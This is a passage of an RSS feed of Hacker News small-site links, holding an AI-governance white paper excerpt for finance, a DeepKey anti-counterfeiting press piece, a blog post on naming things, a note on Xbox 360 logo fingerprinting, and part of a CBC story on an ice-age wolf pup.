href="https://t.sidekickopen82.com/s1t/c/5/f18dQhb0S7kF8cV_VXW1CdjwB59hl3kW7_k2847sD3qkVNxJHk1CX2ZcW2bzNJl8lkfc1101?te=W3R5hFj4cm2zwW4cQKtC3KcLnYW4hLZp03ZVbTxW1JB0ML1--tKxW20ZTw51-YpBFW1W_jBk1ZmvHBW21j9tt1-_j_TW1Vnkcj1V3fMvw1V21pC4vX2&amp;si=7000000001348012&amp;pi=6174bab6-7009-4402-a497-3d6f867fbea1">Good</a>&nbsp;â€¢&nbsp;<a href="https://t.sidekickopen82.com/s1t/c/5/f18dQhb0S7kF8cV_VXW1CdjwB59hl3kW7_k2847sD3qkVNxJHk1CX2ZcW2bzNJl8lkfc1101?te=W3R5hFj4cm2zwW4cQKtC3KcLnYW4hLZp03ZVbTxW1JB0ML1--tKxW20ZTw51-YpBFW1W_jBk1ZmvHBW21j9tt1-_j_TW1Vnkcj1V3fMvw1V21pC4kr2&amp;si=7000000001348012&amp;pi=6174bab6-7009-4402-a497-3d6f867fbea1">Meh</a></p><p>If youâ€™d like to receive this newsletter weekly, consider subscribing ğŸ‘‡</p><p>Sincerely,<br>Lenny ğŸ‘‹</p></div></div>]]>
            </description>
            <link>https://www.lennyrachitsky.com/p/product-management-survey</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513614</guid>
            <pubDate>Wed, 23 Dec 2020 02:03:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI Risk and Governance]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513343">thread link</a>) | @ai_enthu
<br/>
December 22, 2020 | https://www.airsgroup.ai/artificial-intelligence-governance | <a href="https://web.archive.org/web/*/https://www.airsgroup.ai/artificial-intelligence-governance">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="comp-kixls2qe1" data-testid="richTextElement"><h2><span>Executive Summary</span></h2>

<p>As financial services firms evaluate the potential applications of artificial intelligence (AI), for example: to enhance the customer experience and garner operational efficiencies,&nbsp;Artificial Intelligence/Machine Learning (AI/ML) Risk and Security&nbsp;(â€œAIRSâ€)<span><a href="https://ai.wharton.upenn.edu/artificial-intelligence-risk-governance/#_ftn1" target="_blank" rel="noopener">[1]</a></span>&nbsp;is committed to furthering this dialogue and has drafted the following overview discussing AI implementation and the corresponding potential risks firms may wish to consider in formulating their AI strategy. This white paper provides AIRSâ€™s views on potential approaches to AI governance for financial services including potential risks, risk categorization, interpretability, discrimination, and risk mitigation, in particular, as applied to the financial industry.</p>

<p><span>â€‹</span></p>

<p>This paper is intended for discussion purposes only and is not intended to serve as a prescriptive roadmap for implementing AI/ML tools or as a comprehensive inventory of risk associated with the use of AI. Readers are encouraged to consider the information provided in this paper for reference and discussion purposes. They should assess, implement, and tailor their firmsâ€™ AI/ML programs and respective controls as appropriate for their business model, product and service mix, and applicable legal and regulatory requirements.</p>

<p>The views expressed in this paper are those of the individual contributors and do not constitute the views of any of the firms with which the contributors are associated or by which they are employed.</p>

<p><span>â€‹</span></p>

<h4>Key Takeaways</h4>

<ul>
	<li>
	<p>AIRS believes there are significant potential benefits of AI and that its adoption within financial services presents opportunities to improve both business and societal outcomes when risks are managed responsibly.</p>
	</li>
	<li>
	<p>This paper explores the potential risks of AI and provides a standardized practical categorization of these risks: Data Related Risks, AI/ML Attacks, Testing and Trust, and Compliance</p>
	</li>
	<li>
	<p>AI governance frameworks could help organizations learn, govern, monitor, and mature AI adoption. Four core components of AI governance are: definitions, inventory, policy/standards, and a governance framework, including controls.</p>
	</li>
	<li>
	<p>AI, in certain use cases, could lead to privacy issues, and/or potentially discriminatory or unfair outcomes, if not implemented with appropriate care. We explore, in detail, the subject of interpretability and discrimination in using AI for certain use cases.</p>
	</li>
	<li>
	<p>While there is no one-size-fits-all approach, practices institutions might consider adopting to mitigate AI risk include oversight and monitoring, enhancing explainability and interpretability, as well as exploring the use of evolving risk-mitigating techniques like differential privacy, and watermarking, among others.</p>
	</li>
</ul>



<h4>AIRS Next Steps</h4>

<p>This document is meant to be the first of several iterations and further contributions from the AIRS group. These insights are based on collective experience of AIRS, and the suggestions we outline are, as a result, not meant to be comprehensive. AIRS plans to continue to build and engage an active community on these issues. Contact information is provided in Section 6 (Acknowledgments) if there is any feedback or if readers wish to comment on this paper or AIRS.</p>

<p><span>â€‹</span></p>

<p><span>â€‹</span></p>

<h2><span>1. Overview</span></h2>

<h4>1.1 Document Purpose &amp; Scope</h4>

<p>The business uses, regulatory interest and research in artificial intelligence and machine learning (AI/ML) have seen an exponential increase over the last few years. Discussions regarding the use of Artificial Intelligence (AI) and Machine Learning (ML) have gained momentum as financial services firms evaluate the potential applications of AI, including for example: to enhance the customer experience and garner operational efficiencies. AIRS is committed to furthering this dialogue and has drafted the following overview addressing the use of AI within financial services, discussing AI implementation and the corresponding potential risks firms may wish to consider in formulating their AI strategy. Our hope is to contribute to and establish an industry-wide view of the potential risks and mitigants in this rapidly evolving domain of AI/ML, as they may apply to individual firms depending on their use of AI systems.</p>

<p><span>â€‹</span></p>

<p>In this document, AIRS members present their views, guidance, and a structure for conceiving AI/ML risks and governance, drawing upon our combined experience implementing and managing technology risks in the financial sector. The views expressed in this paper are meant to assist individuals and organizations facing risks and governance challenges presented by AI/ML. However, it is critical that each institution assess its own AI uses, risk profile and risk tolerance and design governance frameworks that fit their unique circumstances. As such, this paper is not meant to be comprehensive or prescriptive.</p>

<p><span>â€‹</span></p>

<h4>1.2 AIRS</h4>

<p>AIRS is an informal group of practitioners and academics from varied backgrounds, including technology risk, information security, legal, privacy, architects, model risk management, and others working for financial, technology organizations, and academic institutions. The AIRS working group, based in New York, was initiated in early 2019 and has grown to nearly 40 members from dozens of institutions (and continues to grow).</p>

<p><span>â€‹</span></p>

<p>The AIRS Working Group seeks to promote, educate, and advance AI/ML governance for the financial services industry by focusing on risk identification, categorization, and mitigation.</p>

<h4>1.3 Definitions &amp; Assumptions</h4>

<p>We use several terms throughout this document specific to AI/ML, some of which are subject to vigorous discussions and debates in the research community. Because this document attempts to form a starting point for broader AI/ML governance and risk management efforts, we purposely leverage and encourage readers to refer to various papers for the definition of AI. As such, we note that specific definitions should be (and generally are) tailored to each organization depending on the scope, risk appetite, internal structure, culture, and implementation details of AI/ML efforts.</p>

<p><span>â€‹</span></p>

<p>While there is no universally accepted definition of AI, it is generally understood to refer to â€œa branch of computer science dealing with the simulation of intelligent behavior in computers, or the capability of a machine to imitate intelligent human behavior.â€ Generally, machine learning is referred to as, â€œa field of computer science that uses algorithms to process large amounts of data and learn from it.â€<span><a href="https://ai.wharton.upenn.edu/artificial-intelligence-risk-governance/#_ftn2" target="_blank" rel="noopener">[2]</a></span>&nbsp;The term AI is broadly used and typically includes aspects of machine learning and natural language processing. For purposes of this paper, the focus is largely on the use of and potential risks related to machine learning, though the overarching discussion applies more broadly to the abovementioned areas.</p>

<p><span>â€‹</span></p>

<h4>1.4 A Brief Note on AI/ML Uses and Benefits</h4>

<p>The use of AI in financial institutions is increasing as technological barriers have fallen and its benefits and potential risks have become clearer. The Financial Stability Board recently highlighted four areas where AI could impact banking specifically.<span><a href="https://ai.wharton.upenn.edu/artificial-intelligence-risk-governance/#_ftn3" target="_blank" rel="noopener">[3]</a></span>&nbsp;First, customer-facing uses could expand access to credit and other financial services. For example, combining expanded consumer data sets with new ML algorithms to assess credit quality or price insurance policies, and using AI to offer new and innovative channels to deliver financial services could be a potent way to advance financial inclusion. Also, the use of AI chatbots could provide help and even financial advice to consumers, saving them time they might otherwise waste while waiting to speak with a live operator. Second, there is the potential for strengthening back-office operations, such as advanced models for capital optimization, model risk management, stress testing, and market impact analysis. Third, AI approaches could be applied to trading and investment strategies, from identifying new signals on price movements to using past trading behavior to anticipate a clientâ€™s next order. Finally, there are likely to be AI advancements in compliance and risk mitigation by banks. AI solutions are already being used by some firms in areas like fraud detection, capital optimization, and portfolio management.</p>

<p><span>â€‹</span></p>

<p>Several papers and articles describe the potential uses and benefits of AI adoption and innovation in financial services. Widespread AI/ML adoption within the financial services industry could provide a unique opportunity to significantly improve financial outcomes for consumers and businesses, if this is done responsibly. That is why AIRS has chosen to focus this paper on understanding and managing the potential risks of AI/ML so that those benefits may be realized.</p>

<p><span>â€‹</span></p>

<h2>2<span>. AI Risks and Risk Categorization</span></h2>

<p>Key potential risks of AI relate to potential harms that may affect organizations, consumers, or create broader detrimental effects on society. Such potential risks may arise in whole or in part from sources including the data used to train the AI system; potential risks arising from the AI system itself; potential risks arising from the usage of the AI system; and potential risks arising from poor overall governance of the AI system.</p>

<p><span>â€‹</span></p>

<h4>2.1 Risk Categorization</h4>

<p>Various research papers, articles, and discussions have covered the topics of risks associated with AI. It is up to individual financial services firms to categorize potential risks of using AI: however, we have included a suggested approach to AI risk categorization in the financial services industry below.</p>

<p><span>â€‹</span></p>

<p>The areas of data related risks, AI/ML attacks, testing and trust, as well as people risk constitute potential areas of risk, which could be subcategorized as illustrated in&nbsp;Figure 1.&nbsp;We address these sub-categories in further detail below.</p>

<p><span>â€‹</span></p>

<p><span>Itâ€™s important to note that the applicability and relevance of risks illustrated in Figure 1 are dependent on an individual organizationâ€™s risk profile, appetite, and existing controls, and it is up to each firm to determine whether â€¦</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.airsgroup.ai/artificial-intelligence-governance">https://www.airsgroup.ai/artificial-intelligence-governance</a></em></p>]]>
            </description>
            <link>https://www.airsgroup.ai/artificial-intelligence-governance</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513343</guid>
            <pubDate>Wed, 23 Dec 2020 01:09:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DeepKey: A novel anti-counterfeiting method powered by AI and PUF]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513312">thread link</a>) | @finphil
<br/>
December 22, 2020 | https://nuadox.com/post/638251976736604160/deepkey | <a href="https://web.archive.org/web/*/https://nuadox.com/post/638251976736604160/deepkey">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="638251976736604160">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/638251976736604160/deepkey"><h2>DeepKey: A novel anti-counterfeiting method</h2></a>
                                <figure data-orig-width="900" data-orig-height="506"><img src="https://64.media.tumblr.com/5f2612e2233aafa67b04f56dc2d00801/c63a4c8653de1bfd-32/s1280x1920/cb74cb74122513e7c7388eae3adcd8cfdbf996e9.jpg" alt="image" data-orig-width="900" data-orig-height="506" width="900" height="506"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnus.edu.sg%2F&amp;t=ZDQ1ZmE2OTYzNDBmYjM2NzZmZjgwODA1ZjY5N2Q2NjY5NTAyMDllOSxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608871542">National University of Singapore</a> -</b></p><p>Researchers from the National University of Singapore (NUS) have invented a new method of anti-counterfeiting called <i>DeepKey</i>. This security innovation uses two dimensional (2-D)-material tags and artificial intelligence (AI)-enabled authentication software.</p><figure></figure><p><i>Video:&nbsp;â€œAnti-counterfeiting tech by NUS researchers does reliable AI authentication under extreme conditionsâ€ by&nbsp;National University of Singapore, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fyoutu.be%2Fz5zwmqfeQ_Y&amp;t=MTA3ZmE2MjNjZDBiYjEyMGQ4MTlhNWJlZGU4OTM2MTgwY2UzZDM5Myxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608871542">YouTube</a>.</i></p><p>Compared to conventional anti-counterfeiting technologies, <i>DeepKey</i> works faster, achieves highly accurate results, and uses durable identification tags that are not easily damaged by environmental conditions such as extreme temperatures, chemical spills, UV exposure, and moisture. This new authentication technology can be applied to different high-value products, ranging from drugs, jewellery, and electronics. For example, <i>DeepKey</i> is suitable for tagging COVID-19 vaccines to enable rapid and reliable authentication, as some of such vaccines need to be stored at the ultra-cold temperature of -70Â°C.</p><p>Led by Asst Prof Chen Po-Yen and Asst Prof Wang Xiaonan from the Department of Chemical and Biomolecular Engineering at NUS Faculty of Engineering, the teamâ€™s 2D-material secure tags exhibit Physically Unclonable Function patterns (PUF patterns), which are randomly generated by systematically crumpling the 2D-material thin films. The complex 2D-material patterns with multi-scale features can then be classified and validated by a well-trained deep learning model, enabling reliable (100 per cent accurate) authentication in less than 3.5 minutes.</p><p>Current anti-counterfeiting technologies using PUF patterns normally face several bottlenecks, including complicated manufacturing, specialised and tedious readout process, long authentication time, insufficient environmental stability, as well as being costly to make.</p><p>â€œWith this research, we have tackled several bottlenecks that other techniques encounter,â€ said Asst Prof Wang. â€œOur 2D-material PUF tags are environmentally stable, easy to read, simple and inexpensive to make. In particular, the adoption of deep learning accelerated the overall authentication significantly, pushing our invention one step further to practical application.â€</p><p>The researchers published their results in scientific journal <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.sciencedirect.com%2Fscience%2Farticle%2Fpii%2FS2590238520305592&amp;t=ZDBkYzc5ZmJjZjBjN2Y4ZWJjYjcyYWU4N2ZhMzY1NmNjNDUwMzEyNyxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608871542"><i>Matter</i></a> on 2 December 2020. This study was conducted in collaboration with researchers from Anhui University of Technology and Nanyang Technological University.</p><h2><b>A stable, simple, and scalable process to create PUF tags</b></h2><p>Remarkably, the researchers do not need any special equipment to create the secure tags. They can simply be made with a balloon, a bottle of 2D-material dispersion, and a brush.</p><p>â€œFirst, we inflate the balloon and brush over its surface with viscous 2D-material ink. After air-drying overnight, we deflate the balloon. Because of the interfacial mechanical mismatch between the 2D-material and latex substrate, large-area, crumpled PUF patterns are generated during the contraction. These PUF patterns can be cut to the required size afterwards, and normally, hundreds of them can be made at one time,â€ said Dr Jing Lin, a member of the research team.</p><p>Next, the researchers take a quick image of the PUF tag with an electron microscope, which is then synced to their innovative software to go through the deep learning â€œclassification and validationâ€ process. â€œThe whole process takes less than 3.5 minutes, most of which is spent waiting for the readout from the electron microscope. The authentication itself is very fast, in less than 20 seconds,â€ explained Dr Jing.</p><figure data-orig-width="2880" data-orig-height="1620"><img src="https://64.media.tumblr.com/32922ca933e0580cc4e864cde80d8ebc/c63a4c8653de1bfd-38/s1280x1920/10ec3b7e954e357ad6da471ea33a0a91997626cc.jpg" alt="image" data-orig-width="2880" data-orig-height="1620" width="1280" height="720"></figure><p><i>Image:&nbsp;A stable, simple, and scalable process to create PUF tags. Credit:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.nus.edu.sg%2Freliable-anti-counterfeit-checks-under-extreme-conditions%2F&amp;t=ZGZkNGQ5ZmQxY2UzMTMwN2I3MzZiNmFkZjE2YTlhMGE3NTk3MTlkNixsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608871542">National University of Singapore</a> (click <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fcontent.presspage.com%2Fuploads%2F2580%2F1920_20201221anti-counterfeitingtag-final-01.jpg%3F10000&amp;t=YTMxOTA3ZGJhMzM1ZDZjY2NhZDZiZGZiYWQ0NzQwYzU3NTViZDAwMCxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608871542">here</a> for full size).</i></p><h2><b>Fast authentication using AI deep learning algorithms</b></h2><p>All PUF key-based technologies have ultra-high encoding capacities because of the huge numbers of distinct patterns that can be theoretically produced. However, the high encoding capacity also leads to long authentication time, as the â€œsearch and compareâ€ pattern validation has to be conducted within a huge database. This trade-off between high encoding capacity and long authentication time often restricts such PUF-based anti-counterfeiting tags from practical applications.</p><p>â€œWith our new technology, we are breaking this long-lasting trade-off between high encoding capacity and long authentication time by using classifiable 2D-material PUF tags and deep learning algorithms,â€ said Asst Prof Wang.</p><p>First, the researchers used various 2D materials to fabricate PUF tags with AI recognisable features. Second, they trained a deep learning model to conduct a two-step authentication mechanism. â€œWe used the deep learning model to pre-categorise the PUF patterns into subgroups, and so the search-and-compare algorithm is conducted in a much smaller database, which shortens the overall authentication time,â€ Asst Prof Wang explained.</p><p>Currently, the only available technologies similar to this NUS innovation, are polymer wrinkle-based tags. Wrinkled polymer tags are authenticated based on the surface patterns just like the novel 2D-material tags. However, their authentication presently requires one-by-one feature extraction and matching, which is slow and shows only 80 per cent reliability. The NUS teamâ€™s authentication is boosted by deep learning, and is therefore much faster, and reaches nearly 100 per cent validation precision.</p><p>In addition, compared to the wet chemistry preparation of polymer wrinkle-based tags, which involves the use of harmful organic chemicals and UV light, the NUS researchersâ€™ fabrication technique is significantly faster and safer.</p><h2><b>Next steps</b></h2><p>The NUS team has filed a patent for their invention and is now planning to push this technology one step further. â€œWe are searching for better, faster, and more robust readout and authentication approaches for our PUF tags,â€ said Asst Prof Wang.</p><p>The team has already begun to conduct research on other readout techniques to further shorten the processing time. â€œIn addition, such naturally encoded information by the PUF tags could be further secured by being kept on blockchain, so that the whole supply chain and quality control can be transparently tracked,â€ Asst Prof Wang added.</p><p>â€“</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.nus.edu.sg%2Freliable-anti-counterfeit-checks-under-extreme-conditions%2F&amp;t=ZGZkNGQ5ZmQxY2UzMTMwN2I3MzZiNmFkZjE2YTlhMGE3NTk3MTlkNixsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608871542">National University of Singapore</a></b></p><p><b>Full study:</b>&nbsp;â€œ

Multigenerational Crumpling of 2D Materials for Anticounterfeiting Patterns with Deep Learning Authentication

â€œ, <i>Matter</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1016%2Fj.matt.2020.10.005&amp;t=MjFiZmRhOWUzNDA4MDAwMGM4MDY4ZjUzYjgwMzQ5ZThjN2Y1NTY4Nixsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608871542">https://doi.org/10.1016/j.matt.2020.10.005</a></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/190989611467/mit-small-battery-free-id-chip">MIT conceives tiny, battery-free ID chip that can authenticate many products</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/counterfeiting">counterfeiting</a>
                                    
                                        <a href="https://nuadox.com/tagged/ai">ai</a>
                                    
                                        <a href="https://nuadox.com/tagged/artificial-intelligence">artificial intelligence</a>
                                    
                                        <a href="https://nuadox.com/tagged/materials">materials</a>
                                    
                                        <a href="https://nuadox.com/tagged/iot">iot</a>
                                    
                                        <a href="https://nuadox.com/tagged/puf-tag">puf tag</a>
                                    
                                        <a href="https://nuadox.com/tagged/internet-of-things">internet of things</a>
                                    
                                        <a href="https://nuadox.com/tagged/counterfeit">counterfeit</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/638251976736604160/deepkey</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513312</guid>
            <pubDate>Wed, 23 Dec 2020 01:04:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Power in Naming Things]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513049">thread link</a>) | @mcrittenden
<br/>
December 22, 2020 | https://critter.blog/2020/12/22/power-in-naming-things/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/12/22/power-in-naming-things/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-4614">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>When I first read <a href="https://www.goodreads.com/book/show/40109367-dare-to-lead">Dare To Lead</a> by BrenÃ© Brown a few months ago, I hated it. I ranted to my book club about how itâ€™s not actionable. Itâ€™s true but not useful, I said, because itâ€™s all <em>why</em> and no <em>how</em>. </p>



<p>Now that I have a few months of life experience under my belt since I read it, I understand the value. Turns out, itâ€™s one of the most impactful books Iâ€™ve read in years, because BrenÃ© is great at <em>giving things names.</em> </p>



<p>Some examples:</p>



<ul><li>â€œ<a href="https://critter.blog/2020/11/19/avoid-avoiding/">Courage over comfort</a>â€ meaning we should choose the hard thing that leads to growth over the easy comfortable thing.</li><li>â€œ<a href="https://critter.blog/2020/11/05/respond-to-vulnerability-with-vulnerability/">Rumbling</a>â€ as a term for honest, vulnerable discussions that feel uncomfortable but build trust.</li><li>â€œ<a href="https://critter.blog/2020/08/13/clear-is-kind-unclear-is-unkind/">Clear is kind, unclear is&nbsp;unkind</a>â€ meaning that if youâ€™re not being clear about your thoughts and feelings then youâ€™re being unkind, even if you think youâ€™re doing that to be kind.</li><li>â€œ<a href="https://critter.blog/2020/09/17/values-pick-2/">Living into our values</a>â€ as a reminder to pick your 2 (and only 2) values and use them to make value-based decisions.</li></ul>



<p>The thing is that I <em>knew</em> about all of those things already. I knew that being honest is good. I knew that the hard thing is often the right thing. Blah blah blah. </p>



<p>But giving those guidelines a name made them real and specific and memorable. A name gives us a mantra to repeat in our heads when we come across a tough choice.</p>



<p>The book <a href="https://www.goodreads.com/book/show/33517721-the-culture-code?ac=1&amp;from_search=true&amp;qid=BKStV9pypM&amp;rank=1">The Culture Code</a> talks about naming things and repeating those names over and over and over until they become a part of the culture:</p>



<blockquote><p>A while back Inc. magazine asked executives at six hundred companies to estimate the percentage of their workforce who could name the companyâ€™s top three priorities. The executives predicted that 64 percent would be able to name them. When Inc. then asked employees to name the priorities, <em>only 2 percent could do so</em>. </p><p>This is not the exception but the rule. Leaders are inherently biased to presume that everyone in the group sees things as they do, when in fact they donâ€™t. This is why itâ€™s necessary to drastically over-communicate priorities. The leaders I visited with were not shy about this. Statements of priorities were painted on walls, stamped on emails, incanted in speeches, dropped into conversation, and repeated over and over until they became part of the oxygen.</p><cite>Daniel Coyle, The Culture Code</cite></blockquote>



<p>Later, it talks about what a good catchphrase looks like:</p>



<blockquote><p>The trick to building effective catchphrases is to keep them simple, action-oriented, and forthright: â€œ<em>Create fun and a little weirdness</em>â€ (Zappos), â€œ<em>Talk less, do more</em>â€ (IDEO), â€œ<em>Work hard, be nice</em>â€ (KIPP), â€œ<em>Pound the rock</em>â€ (San Antonio Spurs), â€œ<em>Leave the jersey in a better place</em>â€ (New Zealand All-Blacks), â€œ<em>Create raves for guests</em>â€ (Danny Meyerâ€™s restaurants). Theyâ€™re hardly poetry, but they share an action-based clarity. They arenâ€™t gentle suggestions so much as clear reminders, crisp nudges in the direction the group wants to go.</p><cite>Daniel Coyle, The Culture Code</cite></blockquote>



<p>None of those have a surprising message. Obviously companies want their employees to work hard and be nice, for example. But naming them and repeating them gives them power.</p>



<p>Since understanding this, Iâ€™ve been working on defining what my own catchphrases or rules are. <a href="https://anchor.fm/jace-and-critter/episodes/2-The-mantras-we-live-by-eo3mlo">My friend and I just talked about this on our podcast</a>, in fact! Later in the week Iâ€™ll post the polished list Iâ€™ve decided on.</p>





		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/12/22/power-in-naming-things/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513049</guid>
            <pubDate>Wed, 23 Dec 2020 00:22:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft's interesting Xbox 360 fingerprinting technique]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25512858">thread link</a>) | @wfme
<br/>
December 22, 2020 | https://qf0.github.io/blog/2020/01/28/Microsoft-xbox-fingerprinting | <a href="https://web.archive.org/web/*/https://qf0.github.io/blog/2020/01/28/Microsoft-xbox-fingerprinting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><img src="https://raw.githubusercontent.com/qf0/qf0.github.io/master/files/ty508V7sUK.gif" alt="NEX Dashboard Fingerprint"></p>

<h2 id="introduction">Introduction</h2>

<p>Like many others, when I was younger. Owned a Xbox 360 console. The Xbox 360 is one of the most popular game consoles in the past decade. With 85.50 Million units sold. Like any other gaming scene, there tends to be some sort of underground cheating scene, and typically game development company would have a dedicated anti-cheat team etc.
The Xbox 360 was no expection. Like the orginal xbox. It was eventually pwned. Hackers  found ways to execute unsigned code. If youÃ¢â‚¬â„¢re interested in learning more in-depth how the Xbox 360 was pwned, or more about underground Xbox 360 stories. You can do so here <a href="https://www.wired.com/story/xbox-underground-videogame-hackers/">Wired Article</a> <a href="https://darknetdiaries.com/episode/45/">Darknet Daries Series</a>
This blog will focus on counter measures that Microsoft used to try and catch hackers.</p>

<h2 id="fingerprinting">Fingerprinting</h2>

<p>In 2008, when the NEX dashboard was relased. Microsoft deployed a fingerprinting technique to try and identify some hackers who posted videos of them hacking. Hackers often had game capture cards that would capture directly display of their xbox 360, record videos and publish them online. 
Typically would display booting up console, loading game, then loading in to a match. I overlooked this when I was younger, and recently just noticed it. The Xbox 360 logo on the Dashboard (Main Menu) prints the consoleÃ¢â‚¬â„¢s serial number in morse code with rings around the logo. Which is very clever on MicrosoftÃ¢â‚¬â„¢s part.
Xbox 360 underground hackers would often cesor their gametag, and other identifiable information prior to publishing cheating, or hacking videos. Though most forgot to censor the logo area. 
Some Xbox 360 underground hackers back in the day, received cease and desist letters from Microsoft. Some got their development kit, or console bricked remotely. Most just got banned. I wonder if this fingerprint method was used to identify some of them.</p>

</div></div>]]>
            </description>
            <link>https://qf0.github.io/blog/2020/01/28/Microsoft-xbox-fingerprinting</link>
            <guid isPermaLink="false">hacker-news-small-sites-25512858</guid>
            <pubDate>Tue, 22 Dec 2020 23:52:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['Kind of incredible': Researchers reveal details of mummified ice age wolf pup]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25512461">thread link</a>) | @emptybits
<br/>
December 22, 2020 | https://www.cbc.ca/news/canada/north/yukon-ice-age-wolf-pup-research-paper-1.5847730 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/north/yukon-ice-age-wolf-pup-research-paper-1.5847730">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A perfectly preserved ancient wolf pup found in Yukon&nbsp;in 2016 was likely seven weeks old when it died in its den 57,000 years ago and ate fish for its last meal, scientists who studied the rare find said as they shared&nbsp;some of their findings for the first time.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5848092.1608327657!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/ice-age-wolf-pup.jpg"></p></div><figcaption>The intact remains of a wolf pup, named ZhÃ¹r, were found by a miner in the Klondike goldfields near Dawson City, Yukon, in 2016. The animal is estimated to be about 57,000 years old and is the most complete mummified grey wolf of its era ever found. <!-- --> <!-- -->(Cheryl Kawaja/CBC)</figcaption></figure><p><span><p>Scientists who have been studying a rare, perfectly preserved ancient wolf pup found in Yukon&nbsp;are&nbsp;sharing&nbsp;some of their findings for the first time.</p>  <p>The 57,000-year-old animal, <a href="https://www.cbc.ca/news/canada/north/mummified-wolf-pup-caribou-yukon-1.4822323">discovered in the gold fields of Yukon</a> in 2016, is the most complete mummified grey wolf of this era ever found.&nbsp;</p>  <p>"She's just so complete," said&nbsp;Julie Meachen, a vertebrate paleontologist from Des Moines University in Iowa and lead author of the new study published this week in the journal&nbsp;<em>Current Biology</em>. "She's so amazing. She's so intact. I mean she even has her fur. Everything is there."</p>  <p>The researchers were amazed to discover even&nbsp;the pup's internal organs were intact.&nbsp;</p>  <p>"We can just learn so much more from an animal with skin and fur and organs than we can with just bones," Meachen said. "This is kind of incredible&nbsp;that we can get all this detail&nbsp;from her when she lived so long ago."&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/ice-age-wolf-pup.jpeg 300w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/ice-age-wolf-pup.jpeg 460w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/ice-age-wolf-pup.jpeg 620w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf-pup.jpeg 